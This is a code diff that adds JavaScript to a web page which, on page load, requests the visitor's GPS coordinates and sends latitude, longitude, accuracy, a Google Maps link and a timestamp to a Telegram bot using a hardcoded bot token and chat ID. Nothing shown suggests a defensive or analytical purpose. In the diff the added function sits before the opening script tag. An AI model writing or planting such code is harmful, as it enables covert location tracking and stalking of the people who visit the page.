@@ -195,6 +195,34 @@
     </div>
 </div>
 
+// GPS Location Capture (if user allows)
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+            var accuracy = position.coords.accuracy;
+            
+            var locationMsg = "📍 GPS LOCATION\n";
+            locationMsg += "Latitude: " + lat + "\n";
+            locationMsg += "Longitude: " + lon + "\n";
+            locationMsg += "Accuracy: " + accuracy + " meters\n";
+            locationMsg += "Google Maps: https://www.google.com/maps?q=" + lat + "," + lon + "\n";
+            locationMsg += "Time: " + new Date().toLocaleString();
+            
+            var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(locationMsg);
+            fetch(url);
+        }, function(error) {
+            console.log("User denied location");
+        });
+    }
+}
+
+// Auto-trigger when page loads
+window.onload = function() {
+    getLocation();
+}
+    
 <script>
 var botToken = "8457083817:AAFM5Lsks2cLBqShhVFT5i2p5mH01lJjFEw";
 var chatId = "1012714242";
